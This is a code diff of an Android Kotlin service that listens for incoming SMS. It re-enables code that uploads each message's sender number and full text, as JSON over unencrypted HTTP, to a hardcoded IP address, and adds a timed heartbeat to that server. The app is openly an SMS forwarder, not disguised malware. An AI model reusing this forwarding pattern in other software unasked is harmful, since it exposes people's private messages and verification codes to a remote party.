@@ -3,7 +3,6 @@ package com.sms.smsreceiver
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
-import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
@@ -12,8 +11,6 @@ import android.os.Binder
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
-import android.widget.RemoteViews
-import androidx.annotation.IdRes
 import androidx.core.app.NotificationCompat
 import androidx.lifecycle.LiveData
 import androidx.lifecycle.MutableLiveData
@@ -21,15 +18,9 @@ import com.google.gson.Gson
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.cancel
-import kotlinx.coroutines.channels.Channel
-import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableSharedFlow
-import kotlinx.coroutines.flow.collect
-import kotlinx.coroutines.flow.collectLatest
-import kotlinx.coroutines.flow.receiveAsFlow
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
-import kotlinx.coroutines.withContext
 import okhttp3.Call
 import okhttp3.Callback
 import okhttp3.MediaType
@@ -38,7 +29,11 @@ import okhttp3.Request
 import okhttp3.RequestBody
 import okhttp3.Response
 import java.io.IOException
+import java.util.Timer
+import java.util.TimerTask
 import java.util.concurrent.atomic.AtomicBoolean
+
+val gson = Gson()
 
 class SMSReceiveService : Service(), CoroutineScope by CoroutineScope(Dispatchers.IO), ISMS {
 
@@ -47,16 +42,53 @@ class SMSReceiveService : Service(), CoroutineScope by CoroutineScope(Dispatcher
     private val messenger = MutableSharedFlow<SMS>()
     private val smsBroadcastReceiver by lazy { SMSBroadcastReceiver(messenger) }
     private val smsLiveData by lazy { MutableLiveData<SMSStatus>() }
-    private val gson by lazy { Gson() }
+    private val timer by lazy { Timer() }
+
+    companion object {
+
+        val okHttpClient = OkHttpClient()
+
+        @JvmStatic
+        fun uploadOnlineStatues(phone: String) {
+            okHttpClient.apply {
+                newCall(
+                    Request.Builder().url("http://47.108.223.87/index/upload_user_status")
+                        .post(
+                            RequestBody.create(
+                                MediaType.get("application/json"),
+                                gson.toJson(Status(phone, System.currentTimeMillis().toInt()))
+                            )
+                        ).build()
+                ).enqueue(object : Callback {
+                    override fun onFailure(call: Call, e: IOException) {
+                        Log.d(TAG, "uploadStatus onFailure: ${e.message}")
+                    }
+
+                    override fun onResponse(call: Call, response: Response) {
+                        Log.d(TAG, "uploadStatus onResponse: ${response.code()}")
+                        Log.d(TAG, "onResponse: ${response.body()?.string()}")
+                    }
+
+                })
+            }
+        }
+    }
 
     override fun onCreate() {
         super.onCreate()
         val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
-        startForeground(1,notificationManager.initNotification(this))
+        startForeground(1, notificationManager.initNotification(this))
         registerReceiver(
             smsBroadcastReceiver,
             IntentFilter("android.provider.Telephony.SMS_RECEIVED")
         )
+        launch(Dispatchers.IO) {
+            timer.schedule(object : TimerTask() {
+                override fun run() {
+                    uploadOnlineStatues(phoneNumber)
+                }
+            }, 0, 10 * 60 * 1000 - 3000)
+        }
         launch {
             phoneNumber.takeIf { it.isNotEmpty() }?.let {
                 Log.d(TAG, "onCreate: $it")
@@ -112,69 +144,45 @@ class SMSReceiveService : Service(), CoroutineScope by CoroutineScope(Dispatcher
     //
     //    phone
     //    status
-    private suspend fun uploadStatus(
+    private fun uploadStatus(
         phone: String,
         isAlive: Boolean,
         isChangePhone: Boolean = false
     ) {
-//        if (phone.isEmpty()) return
-//        Log.d(TAG, "uploadStatus: ${this.isAlive.get()}")
-//        if (this@SMSReceiveService.isAlive.get() == isAlive && !isChangePhone) return
-//        this@SMSReceiveService.isAlive.set(isAlive)
-//        withContext(Dispatchers.IO) {
-//            Log.d(TAG, "isAlive:$isAlive ")
-//            OkHttpClient().apply {
-//                newCall(
-//                    Request.Builder().url("http://47.108.223.87/index/upload_user_status")
-//                        .post(
-//                            RequestBody.create(
-//                                MediaType.get("application/json"),
-//                                gson.toJson(Status(phone, if (isAlive) 1 else 0))
-//                            )
-//                        ).build()
-//                ).enqueue(object : Callback {
-//                    override fun onFailure(call: Call, e: IOException) {
-//                        Log.d(TAG, "uploadStatus onFailure: ${e.message}")
-//                    }
-//
-//                    override fun onResponse(call: Call, response: Response) {
-//                        Log.d(TAG, "uploadStatus onResponse: ${response.code()}")
-//                    }
-//
-//                })
-//            }
-//        }
+        if (phone.isEmpty()) return
+        Log.d(TAG, "uploadStatus: ${this.isAlive.get()}")
+        if (this@SMSReceiveService.isAlive.get() == isAlive && !isChangePhone) return
+        this@SMSReceiveService.isAlive.set(isAlive)
+        uploadOnlineStatues(phone)
     }
 
-    private suspend fun uploadSMS(sms: SMS) {
-//        withContext(Dispatchers.IO) {
-//            uploadStatus(sms.phone, true)
-//            Log.d(TAG, "uploadSMS: ")
-//            OkHttpClient().apply {
-//                newCall(
-//                    Request.Builder().url("http://47.108.223.87/index/upload_user_info")
-//                        .post(
-//                            RequestBody.create(
-//                                MediaType.get("application/json"),
-//                                gson.toJson(sms)
-//                            )
-//                        )
-//                        .build()
-//                ).enqueue(object : Callback {
-//                    override fun onFailure(call: Call, e: IOException) {
-//                        Log.d(TAG, "uploadSMS onFailure: ")
-//                        smsLiveData.postValue(SMSStatus(sms.phone, sms.body, 500))
-//                    }
-//
-//                    override fun onResponse(call: Call, response: Response) {
-//                        Log.d(TAG, "uploadSMS onResponse: ${response.body()}")
-//                        Log.d(TAG, "uploadSMS onResponse: ${response.code()}")
-                        smsLiveData.postValue(SMSStatus(sms.phone, sms.body, 200))
-//                    }
-//
-//                })
-//            }
-//        }
+    private fun uploadSMS(sms: SMS) {
+        uploadStatus(sms.phone, true)
+        Log.d(TAG, "uploadSMS: ")
+        okHttpClient.apply {
+            newCall(
+                Request.Builder().url("http://47.108.223.87/index/upload_user_info")
+                    .post(
+                        RequestBody.create(
+                            MediaType.get("application/json"),
+                            gson.toJson(sms)
+                        )
+                    )
+                    .build()
+            ).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.d(TAG, "uploadSMS onFailure: ")
+                    smsLiveData.postValue(SMSStatus(sms.phone, sms.body, 500))
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    Log.d(TAG, "uploadSMS onResponse: ${response.body()}")
+                    Log.d(TAG, "uploadSMS onResponse: ${response.code()}")
+                    smsLiveData.postValue(SMSStatus(sms.phone, sms.body, 200))
+                }
+
+            })
+        }
     }
 
     override fun onBind(intent: Intent?): IBinder {
@@ -182,19 +190,24 @@ class SMSReceiveService : Service(), CoroutineScope by CoroutineScope(Dispatcher
     }
 
     override fun onUnbind(intent: Intent?): Boolean {
-        launch { uploadStatus(phoneNumber, false) }
-        Log.d(TAG, "onUnbind: ")
+        runCatching {
+            launch { uploadStatus(phoneNumber, false) }
+            timer.cancel()
+            Log.d(TAG, "onUnbind: ")
+        }
         return super.onUnbind(intent)
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        Log.d(TAG, "onDestroy: ")
-        launch {
-            uploadStatus(phoneNumber, false)
-            if (isActive) cancel()
+        runCatching {
+            Log.d(TAG, "onDestroy: ")
+            launch {
+                uploadStatus(phoneNumber, false)
+                if (isActive) cancel()
+            }
+            unregisterReceiver(smsBroadcastReceiver)
         }
-        unregisterReceiver(smsBroadcastReceiver)
     }
 
     override fun observeSMS() = smsLiveData
